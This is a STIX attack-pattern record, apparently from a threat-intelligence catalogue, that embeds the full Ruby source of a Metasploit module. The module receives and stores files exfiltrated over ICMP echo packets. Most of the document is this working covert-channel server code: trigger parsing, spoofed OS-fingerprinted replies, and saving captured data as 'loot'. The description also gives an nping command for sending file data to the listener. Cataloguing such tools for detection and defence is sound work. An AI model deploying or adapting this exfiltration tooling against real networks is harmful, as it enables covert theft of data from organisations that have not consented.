{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c09f727-7765-4750-8add-54567495ac27",
    "created": "2024-08-14T16:21:47.863934Z",
    "modified": "2024-08-14T16:21:47.863938Z",
    "name": "ICMP Exfiltration Service",
    "description": " This module is designed to provide a server-side component to receive and store files exfiltrated over ICMP echo request packets.  To use this module you will need to send an initial ICMP echo request containing the specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or a random filename can be assigned). All data received from this source will automatically be added to the receive buffer until an ICMP echo request containing a specific end trigger (defaults to '^EOL') is received.  Suggested Client: Data can be sent from the client using a variety of tools. One such example is nping (included with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string \"BOFtest.txt\" -c1 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/icmp_exfil.rb",
            "external_id": "icmp_exfil.rb"
        },
        {
            "source_name": "reference",
            "url": "https://nmap.org/book/nping-man.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Capture\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'         => 'ICMP Exfiltration Service',\n      'Description'  => %q{\n        This module is designed to provide a server-side component to receive and store files\n        exfiltrated over ICMP echo request packets.\n\n        To use this module you will need to send an initial ICMP echo request containing the\n        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or\n        a random filename can be assigned). All data received from this source will automatically\n        be added to the receive buffer until an ICMP echo request containing a specific end trigger\n        (defaults to '^EOL') is received.\n\n        Suggested Client:\n        Data can be sent from the client using a variety of tools. One such example is nping (included\n        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string \"BOFtest.txt\" -c1\n      },\n      'Author'      => 'Chris John Riley',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          # packetfu\n          ['URL','https://github.com/todb/packetfu'],\n          # nping\n          ['URL', 'https://nmap.org/book/nping-man.html'],\n          # simple icmp\n          ['URL', 'https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']\n        ]\n    )\n\n    register_options([\n      OptString.new('START_TRIGGER', [true, 'Trigger for beginning of file', '^BOF']),\n      OptString.new('END_TRIGGER',   [true, 'Trigger for end of file', '^EOF']),\n      OptString.new('RESP_START',    [true, 'Data to respond when initial trigger matches', 'SEND']),\n      OptString.new('RESP_CONT',     [true, 'Data ro resond when continuation of data expected', 'OK']),\n      OptString.new('RESP_END',      [true, 'Data to response when EOF received and data saved', 'COMPLETE']),\n      OptString.new('BPF_FILTER',    [true, 'BFP format filter to listen for', 'icmp']),\n      OptString.new('INTERFACE',     [false, 'The name of the interface']),\n      OptBool.new('FNAME_IN_PACKET', [true, 'Filename presented in first packet straight after START_TRIGGER', true])\n    ])\n\n    register_advanced_options([\n      OptEnum.new('CLOAK',      [true, 'OS fingerprint to use for packet creation', 'linux', ['windows', 'linux', 'freebsd']]),\n      OptBool.new('PROMISC',    [true, 'Enable/Disable promiscuous mode', false]),\n      OptAddress.new('LOCALIP', [false, 'The IP address of the local interface'])\n    ])\n\n    deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','SECRET','GATEWAY_PROBE_HOST', 'GATEWAY_PROBE_PORT', 'TIMEOUT')\n  end\n\n  def run\n    begin\n      # check Pcaprub is up to date\n      if not netifaces_implemented?\n        print_error(\"WARNING : Pcaprub is not uptodate, some functionality will not be available\")\n        netifaces = false\n      else\n        netifaces = true\n      end\n\n      @interface = datastore['INTERFACE'] || Pcap.lookupdev\n      # this is needed on windows cause we send interface directly to Pcap functions\n      @interface = get_interface_guid(@interface)\n      @iface_ip = datastore['LOCALIP']\n      @iface_ip ||= get_ipv4_addr(@interface) if netifaces\n      raise \"Interface IP is not defined and can not be guessed\" unless @iface_ip\n\n      # start with blank slate\n      @record = false\n      @record_data = ''\n\n      if datastore['PROMISC']\n        print_status(\"Warning: Promiscuous mode enabled. This may cause issues!\")\n      end\n\n      # start icmp listener process - loop\n      icmp_listener\n\n    ensure\n      store_file\n      print_status(\"\\nStopping ICMP listener on #{@interface} (#{@iface_ip})\")\n    end\n  end\n\n  def icmp_listener\n    # start icmp listener\n\n    print_status(\"ICMP Listener started on #{@interface} (#{@iface_ip}). Monitoring for trigger packet containing #{datastore['START_TRIGGER']}\")\n    if datastore['FNAME_IN_PACKET']\n      print_status(\"Filename expected in initial packet, directly following trigger (e.g. #{datastore['START_TRIGGER']}filename.ext)\")\n    end\n\n    cap = PacketFu::Capture.new(\n            :iface   => @interface,\n            :start   => true,\n            :filter  => datastore['BPF_FILTER'],\n            :promisc => datastore['PROMISC']\n            )\n    loop {\n      cap.stream.each do | pkt |\n        packet = PacketFu::Packet.parse(pkt)\n        data = packet.payload[4..-1]\n\n        if packet.is_icmp? and data =~ /#{datastore['START_TRIGGER']}/\n          # start of new file detected\n          vprint_status(\"#{Time.now}: ICMP (type %d code %d) SRC:%s DST:%s\" %\n                [packet.icmp_type, packet.icmp_code, packet.ip_saddr, packet.ip_daddr])\n\n          # detect and warn if system is responding to ICMP echo requests\n          # suggested fixes:\n          # -(linux) echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all\n          # -(Windows) netsh firewall set icmpsetting 8 disable\n          # -(Windows) netsh firewall set opmode mode = ENABLE\n\n          if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip\n            print_error \"Dectected ICMP echo response. You must either disable ICMP handling\"\n            print_error \"or try a more restrictive BPF filter. You might try:\"\n            print_error \" set BPF_FILTER icmp and not src #{datastore['LOCALIP']}\"\n            return\n          end\n\n          if @record\n            print_error(\"New file started without saving old data\")\n            store_file\n          end\n\n          # begin recording stream\n          @record = true\n          @record_host = packet.ip_saddr\n          @record_data = ''\n\n          # set filename from data in incoming icmp packet\n          if datastore['FNAME_IN_PACKET']\n            @filename = data[((datastore['START_TRIGGER'].length)-1)..-1].strip\n          end\n          # if filename not sent in packet, or FNAME_IN_PACKET false set time based name\n          if not datastore['FNAME_IN_PACKET'] or @filename.empty?\n            @filename = \"icmp_exfil_\" + ::Time.now.to_i.to_s # set filename based on current time\n          end\n\n          print_good(\"Beginning capture of \\\"#{@filename}\\\" data\")\n\n          # create response packet icmp_pkt\n          icmp_response, contents = icmp_packet(packet, datastore['RESP_START'])\n\n          if not icmp_response\n            raise \"Could not build ICMP response\"\n          else\n            # send response packet icmp_pkt\n            send_icmp(icmp_response, contents)\n          end\n\n        elsif packet.is_icmp? and @record and @record_host == packet.ip_saddr\n          # check for EOF marker, if not continue recording data\n\n          if data =~ /#{datastore['END_TRIGGER']}/\n            # end of file marker found\n            print_status(\"#{@record_data.length} bytes of data recevied in total\")\n            print_good(\"End of File received. Saving \\\"#{@filename}\\\" to loot\")\n            store_file\n\n            # create response packet icmp_pkt\n            icmp_response, contents = icmp_packet(packet, datastore['RESP_END'])\n\n            if not icmp_response\n              raise \"Could not build ICMP response\"\n            else\n              # send response packet icmp_pkt\n              send_icmp(icmp_response, contents)\n            end\n\n            # turn off recording and clear status\n            @record = false\n            @record_host = ''\n            @record_data = ''\n\n          else\n            # add data to recording and continue\n            @record_data << data.to_s()\n            vprint_status(\"Received #{data.length} bytes of data from #{packet.ip_saddr}\")\n\n            # create response packet icmp_pkt\n            icmp_response, contents = icmp_packet(packet, datastore['RESP_CONT'])\n\n            if not icmp_response\n              raise \"Could not build ICMP response\"\n            else\n              # send response packet icmp_pkt\n              send_icmp(icmp_response, contents)\n            end\n          end\n        end\n      end\n    }\n  end\n\n  def icmp_packet(packet, contents)\n    # create icmp response\n\n    @src_ip = packet.ip_daddr\n    src_mac = packet.eth_daddr\n    @dst_ip = packet.ip_saddr\n    dst_mac = packet.eth_saddr\n    icmp_id = packet.payload[0,2]\n    icmp_seq = packet.payload[2,2]\n\n    # create payload with matching id/seq\n    resp_payload = icmp_id + icmp_seq + contents\n\n    icmp_pkt = PacketFu::ICMPPacket.new(:flavor => datastore['CLOAK'].downcase)\n    icmp_pkt.eth_saddr = src_mac\n    icmp_pkt.eth_daddr = dst_mac\n    icmp_pkt.icmp_type = 0\n    icmp_pkt.icmp_code = 0\n    icmp_pkt.payload = resp_payload\n    icmp_pkt.ip_saddr = @src_ip\n    icmp_pkt.ip_daddr = @dst_ip\n    icmp_pkt.recalc\n\n    icmp_response = icmp_pkt\n\n    return icmp_response, contents\n  end\n\n  def send_icmp(icmp_response, contents)\n    # send icmp response on selected interface\n    icmp_response.to_w(iface = @interface)\n    vprint_good(\"Response sent to #{@dst_ip} containing response trigger : \\\"#{contents}\\\"\")\n  end\n\n  def store_file\n    # store the file in loot if data is present\n    if @record_data and not @record_data.empty?\n      loot = store_loot(\n          \"icmp_exfil\",\n          \"text/xml\",\n          @src_ip,\n          @record_data,\n          @filename,\n          \"ICMP Exfiltrated Data\"\n          )\n      print_good(\"Incoming file \\\"#{@filename}\\\" saved to loot\")\n      print_good(\"Loot filename: #{loot}\")\n    end\n  end\nend\n"
}